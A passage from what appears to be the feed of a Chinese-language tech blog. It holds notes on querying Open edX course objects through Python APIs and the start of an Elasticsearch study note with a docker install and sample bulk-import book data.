    &lt;span class="n"&gt;course_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SlashSeparatedCourseKey&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;from_deprecated_string&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;course_id_string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;courseware.courses&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;get_course&lt;/span&gt;  
    &lt;span class="n"&gt;course&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_course&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;course_id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# CourseDescriptorWithMixins&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;捕获对象：CourseDescriptorWithMixins&lt;/li&gt;
&lt;li&gt;等效于:  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;xmodule.modulestore.django&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;modulestore&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;modulestore&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_course&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;course_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;一些实用属性和方法:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;advanced_modules&lt;/span&gt; &lt;span class="c1"&gt;#高级模块&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;children&lt;/span&gt; &lt;span class="c1"&gt;# &amp;gt;&amp;gt;&amp;gt;BlockUsageLocator  已有的章节&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;category&lt;/span&gt; &lt;span class="c1"&gt;# u&amp;#39;course&amp;#39;  自省功能 ,course.children[0].category -&amp;gt; u&amp;#39;chapter&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;display_name&lt;/span&gt; &lt;span class="c1"&gt;# 课程名 ，可以在高级设置里修改&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;display_name_with_defaulte&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;display_number_with_default&lt;/span&gt; &lt;span class="c1"&gt;#course name，在course_id_string中间的那个值（唯一性），可以在高级设置里修改&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fields&lt;/span&gt; &lt;span class="c1"&gt;# 列出所有属性&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_children&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;# 获得子节点&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_content_titles&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;# 获得所有内容的标题&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_context&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#显示出所有的context，使用keys来观察层次，其中数据很完备&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;html_textbooks&lt;/span&gt; 
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt; &lt;span class="c1"&gt;#&amp;gt;&amp;gt;&amp;gt;CourseLocator&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;number&lt;/span&gt;  &lt;span class="c1"&gt;# course name/number 有唯一性&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pdf_textbooks&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;raw_grader&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tabs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="c1"&gt;#&amp;gt;&amp;gt;&amp;gt;u&amp;#39;Courseware&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;top_level_discussion_topic_ids&lt;/span&gt; 
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;xml_attributes&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;xml_element_name&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;get_course_about_section&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;方法路径： &lt;code&gt;from courseware.courses import get_course_about_section&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;源码: &lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/lms/djangoapps/courseware/courses.py#L160"&gt;get_course_about_section&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Valid keys:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;overview&lt;/li&gt;
&lt;li&gt;short_description&lt;/li&gt;
&lt;li&gt;description&lt;/li&gt;
&lt;li&gt;key_dates (includes start, end, exams, etc)&lt;/li&gt;
&lt;li&gt;video&lt;/li&gt;
&lt;li&gt;course_staff_short&lt;/li&gt;
&lt;li&gt;course_staff_extended&lt;/li&gt;
&lt;li&gt;requirements&lt;/li&gt;
&lt;li&gt;syllabus&lt;/li&gt;
&lt;li&gt;textbook&lt;/li&gt;
&lt;li&gt;faq&lt;/li&gt;
&lt;li&gt;effort&lt;/li&gt;
&lt;li&gt;more_info&lt;/li&gt;
&lt;li&gt;ocw_links&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;案例:&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/lms/templates/courseware/course_about.html"&gt;course_about.html&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;疑惑，这个放在course_about页面正常，直接使用有误，跟踪course  //course缺乏static_asset_path属性，所以报错&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/lms/djangoapps/courseware/views.py#L799"&gt;views course_about&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;CourseDetails&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;方法路径： &lt;code&gt;from openedx.core.djangoapps.models.course_details import CourseDetails&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;源码: &lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/openedx/core/djangoapps/models/course_details.py#L30"&gt;CourseDetails&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;使用方法:  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;openedx.core.djangoapps.models.course_details&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;CourseDetails&lt;/span&gt;
    &lt;span class="n"&gt;course_id_string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;u&amp;quot;course-v1:a+b+c&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;course_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SlashSeparatedCourseKey&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;from_deprecated_string&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;course_id_string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;course_details&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CourseDetails&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;course_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;#course_details.overview&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;实用代码&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;CourseKey.from_string:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;opaque_keys.edx.keys&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;CourseKey&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;modulestore&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_course&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CourseKey&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;from_string&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;course_id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/lms/djangoapps/courseware/courses.py#L465"&gt;get_problems_in_section&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 28 Apr 2016 00:00:00 +0000</pubDate><guid>tag:,2016-04-28:open-edx-course-data-explore.html</guid><category>edx</category></item><item><title>elasticsearch学习笔记</title><link>/elasticsearch-note.html</link><description>&lt;h1&gt;介绍&lt;/h1&gt;
&lt;p&gt;Elasticsearch 是一个分布式可扩展的实时搜索和分析引擎。它能帮助你搜索、分析和浏览数据，而往往大家并没有在某个项目一开始就预料到需要这些功能。Elasticsearch之所以出现就是为了重新赋予原始数据新的活力。&lt;/p&gt;
&lt;p&gt;学习过程中主要参考:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.elastic.co/guide/index.html"&gt;官方文档&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.gitbook.com/book/looly/elasticsearch-the-definitive-guide-cn/details"&gt;Elasticsearch权威指南&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;github中的案例&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;提醒&lt;/h1&gt;
&lt;p&gt;注意先查看自己使用的elasticsearch的版本。Open edX中目前使用的elasticsearch为0.92版，十分落后，以至于许多特性都和最新的版本不一致&lt;/p&gt;
&lt;h1&gt;目的&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;for open edx&lt;/li&gt;
&lt;li&gt;for my note system&lt;/li&gt;
&lt;li&gt;full-text search&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;关键概念&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;index -&amp;gt; type -&amp;gt; document&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;类比数据库的话，我们可以认为&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Relational DB -&amp;gt; Databases -&amp;gt; Tables -&amp;gt; Rows -&amp;gt; Columns
Elasticsearch -&amp;gt; Indices   -&amp;gt; Types  -&amp;gt; Documents -&amp;gt; Fields
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;install&lt;/h1&gt;
&lt;p&gt;当然是使用docker，最为方便啦&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo docker pull elasticsearch
sudo mkdir -p /data/elasticsearch
sudo docker run -d --name elasticsearch -p 9200:9200 -v /data/elasticsearch:/usr/share/elasticsearch/data elasticsearch
sudo docker &lt;span class="nb"&gt;exec&lt;/span&gt;  elasticsearch env &lt;span class="c1"&gt;#我的是：ELASTICSEARCH_VERSION=2.3.0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;quick start&lt;/h1&gt;
&lt;p&gt;我们跟着这个案例走一遍:&lt;a href="https://github.com/siddontang/elasticsearch-note/blob/master/searching_data.md"&gt;searching_data&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;案例中有用到&lt;code&gt;_bulk&lt;/code&gt;，关于&lt;code&gt;_bulk&lt;/code&gt;,参考这里:&lt;a href="http://stackoverflow.com/questions/23798433/json-bulk-import-to-elasticstearch"&gt;JSON Bulk import to Elasticstearch&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我们来看一下原始数据(&lt;a href="https://raw.githubusercontent.com/siddontang/elasticsearch-note/master/data/book_document.json"&gt;book_document.json&lt;/a&gt;)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;index&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;_index&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;library&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;book&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;All Quiet on the Western Front&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;otitle&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Im Westen nichts Neues&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;author&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Erich Maria Remarque&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;year&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1929&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;characters&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Paul Bäumer&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Albert Kropp&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Haie Westhus&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Fredrich Müller&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Stanislaus Katczinsky&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Tjaden&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;tags&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;novel&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;copies&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;available&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;section&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;index&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;_index&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;library&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;book&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Catch-22&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;author&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Joseph Heller&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;year&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1961&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;characters&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;John Yossarian&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Captain Aardvark&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Chaplain Tappman&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Colonel Cathcart&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Doctor Daneeka&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;tags&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;novel&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;copies&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;available&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;section&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;index&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;_index&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;library&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;book&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;The Complete Sherlock Holmes&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;author&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Arthur Conan Doyle&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;year&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1936&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;characters&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Sherlock Holmes&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Dr. Watson&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;G. Lestrade&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;tags&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:[],&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;copies&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;available&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;section&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;index&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;_index&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;library&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;book&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;4&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Crime and Punishment&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;otitle&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Преступлéние и наказáние&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;author&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Fyodor Dostoevsky&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;year&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1886&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;characters&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Raskolnikov&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Sofia Semyonovna Marmeladova&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;tags&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[],&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;copies&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;available&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span 